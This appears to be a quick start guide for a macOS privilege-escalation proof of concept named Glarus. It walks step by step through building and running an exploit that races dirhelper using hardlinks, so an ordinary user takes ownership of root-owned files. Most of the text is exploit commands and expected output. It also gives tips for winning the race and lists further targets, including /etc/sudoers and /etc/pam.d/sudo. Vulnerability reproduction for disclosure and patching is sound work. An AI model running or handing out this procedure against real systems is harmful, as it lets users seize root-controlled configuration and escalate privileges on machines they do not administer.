# Glarus PoC - Quick Start Guide

This guide allows reproduction of the vulnerability in under 5 minutes.

## Prerequisites

- macOS 14.0 or later
- Xcode Command Line Tools: `xcode-select --install`
- Terminal access

## Step 1: Build Components (30 seconds)

```bash
cd glarus_poc_final
./scripts/build.sh
```

Expected output:
```
═══════════════════════════════════════════════════════════════
  Glarus PoC - Build
═══════════════════════════════════════════════════════════════

[1/3] Compiling dirhelper client...
      ✓ Compiled successfully

[2/3] Creating sandboxed app bundle...
      ✓ App bundle created
      ✓ Signed with sandbox entitlements

[3/3] Compiling race binary...
      ✓ Race binary compiled

═══════════════════════════════════════════════════════════════
  ✓ Build Complete
═══════════════════════════════════════════════════════════════
```

## Step 2: Run Exploit (2-3 minutes)

```bash
./scripts/exploit.sh /etc/hosts
```

The exploit will:
1. Set up the hardlink structure
2. Start the race condition binary
3. Trigger dirhelper repeatedly
4. Report success or failure

Expected output on success:
```
═══════════════════════════════════════════════════════════════
  🎉 SUCCESS! You now own: /etc/hosts
═══════════════════════════════════════════════════════════════

File ownership changed:
  Before: uid=0 (root)
  After:  uid=501 (you)

-rw-r--r--  1 youruser  wheel  213 Dec 20 10:30 /etc/hosts
```

## Step 3: Verify (10 seconds)

```bash
# Check file ownership
ls -la /etc/hosts

# You should see your username as owner instead of root
```

## Step 4: Cleanup (10 seconds)

```bash
./scripts/cleanup.sh
```

## Troubleshooting

### "Race not winning"

Race conditions are probabilistic. Try:
```bash
# Run with more attempts
GLARUS_MAX_ATTEMPTS=100000 ./scripts/exploit.sh /etc/hosts

# Or use spin mode for faster reactions
GLARUS_RACE_MODE=spin ./scripts/exploit.sh /etc/hosts
```

### "Hardlink creation failed"

The target may be protected. Try a different file:
```bash
# Test if target can be hardlinked
./scripts/exploit.sh --test /etc/hosts

# Try alternative targets
./scripts/exploit.sh /etc/newsyslog.conf
./scripts/exploit.sh /etc/asl.conf
```

### "DirhelperClient not found"

Rebuild the components:
```bash
./scripts/build.sh
```

## Alternative Targets to Test

```bash
# These should work on most systems:
./scripts/exploit.sh /etc/hosts
./scripts/exploit.sh /etc/newsyslog.conf
./scripts/exploit.sh /etc/asl.conf

# These require TCC approval (user consent dialog):
./scripts/exploit.sh /etc/pam.d/sudo
./scripts/exploit.sh /etc/sudoers
```

## What Success Looks Like

Before exploit:
```
$ ls -la /etc/hosts
-rw-r--r--  1 root  wheel  213 Oct 15 09:22 /etc/hosts
```

After exploit:
```
$ ls -la /etc/hosts
-rw-r--r--  1 youruser  wheel  213 Oct 15 09:22 /etc/hosts
```

The file owner changed from `root` to your username, demonstrating the privilege escalation vulnerability.
